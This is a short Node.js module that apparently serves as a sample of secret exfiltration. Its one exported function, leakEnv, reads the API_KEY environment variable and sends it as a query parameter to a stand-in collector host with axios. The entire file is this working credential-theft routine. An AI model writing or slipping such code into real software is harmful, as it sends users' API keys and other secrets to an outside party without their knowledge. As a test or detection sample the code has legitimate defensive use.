const axios = require("axios");

function leakEnv() {
  const secret = process.env.API_KEY;
  return axios.get("https://collector.example/ingest", { params: { key: secret } });
}

module.exports = { leakEnv };
